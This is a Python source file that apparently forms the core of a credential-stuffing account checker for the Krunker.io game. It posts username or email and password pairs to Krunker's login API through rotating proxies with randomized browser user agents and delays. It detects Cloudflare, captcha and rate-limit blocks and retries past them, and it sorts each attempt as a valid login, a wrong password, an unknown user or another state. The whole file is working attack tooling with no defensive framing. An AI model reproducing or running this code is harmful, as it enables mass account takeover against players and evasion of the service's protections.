import requests,time,random

username="https://gapi.svc.krunker.io/auth/login/username";email="https://gapi.svc.krunker.io/auth/login/email";origin="https://krunker.io/"

class Auth:
 def e(s,u):return"@"in u and"."in u
 def ua(s):return f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.choice(['119.0.0.0','118.0.0.0','117.0.0.0','116.0.0.0'])} Safari/537.36"
 
 def p(s,t):
  tL=t.lower()
  if'"login_ok"'in t or'"type":"login_ok"'in t:return"login_ok"
  elif'"ensure_migrated"'in t or'"type":"ensure_migrated"'in t:return"needs_migrate"
  elif'"ensure_verified"'in t or'"type":"ensure_verified"'in t:return"needs_verification"
  elif any(x in tL for x in["password incorrect","bad credentials","provided password needs to be at least 8 characters"]):return"password_incorrect"
  elif any(x in tL for x in["username incorrect","email not found"]):return"username_incorrect"
  elif "invalid account or password" in tL:return"invalid"
  else:return"unknown"

 def jwt(s, username, password, proxy=None, max_retries=5):
    for attempt in range(max_retries):
        try:
            d = {"email": username, "password": password} if s.e(username) else {"username": username, "password": password}
            url = email if s.e(username) else username
            h = {
                "Content-Type": "application/json",
                "User-Agent": s.ua(),
                "Origin": origin,
                "Referer": "https://krunker.io/",
                "Accept": "application/json, text/plain, */*"
            }
            pd = {"http": proxy, "https": proxy} if proxy else None
            r = requests.post(url, json=d, headers=h, timeout=15, proxies=pd)
            if r.status_code == 200:
                resp = r.json()
                token = resp.get('data', {}).get('access_token', '')
                if token:
                    return token
        except:
            continue
    return ''
  
 def cl(s,u,p,k,max_retries=5):
  for attempt in range(max_retries):
   try:
    time.sleep(random.uniform(.3,.8))
    d={"email":u,"password":p}if s.e(u)else{"username":u,"password":p}
    url=email if s.e(u)else username
    h={"Content-Type":"application/json","User-Agent":s.ua(),"Origin":origin,"Referer":"https://krunker.io/","Accept":"application/json, text/plain, */*","Accept-Language":"en-US,en;q=0.9","Accept-Encoding":"gzip, deflate, br","Connection":"keep-alive","Sec-Fetch-Dest":"empty","Sec-Fetch-Mode":"cors","Sec-Fetch-Site":"same-site"}
    pr=k.gp();pd={"http":pr,"https":pr}if pr else None
    r=requests.post(url,json=d,headers=h,timeout=15,proxies=pd)
    t=r.text
    if any(x in t.lower()for x in["cloudflare","sorry, you have been blocked","rate limit exceeded","too many requests","access denied","forbidden","captcha"]):
     if attempt < max_retries - 1:
      time.sleep(random.uniform(1, 2))
      continue
     return"blocked"
    if r.status_code!=200:
     if attempt < max_retries - 1:
      time.sleep(random.uniform(0.5, 1.5))
      continue
     return f"{t[:100]}"
    st=s.p(t)
    if st in ["login_ok", "needs_migrate", "password_incorrect", "username_incorrect", "invalid"]:
     return st
    if attempt < max_retries - 1:
     time.sleep(random.uniform(0.5, 1.5))
     continue
    return st if st!="unknown"else f"unknown - {t[:100]}"
   except requests.exceptions.Timeout:
    if attempt < max_retries - 1:
     time.sleep(random.uniform(1, 2))
     continue
    return"timeout"
   except Exception as e:
    if attempt < max_retries - 1:
     time.sleep(random.uniform(0.5, 1.5))
     continue
    return f"error - {str(e)}"
  return "max_retries_exceeded"
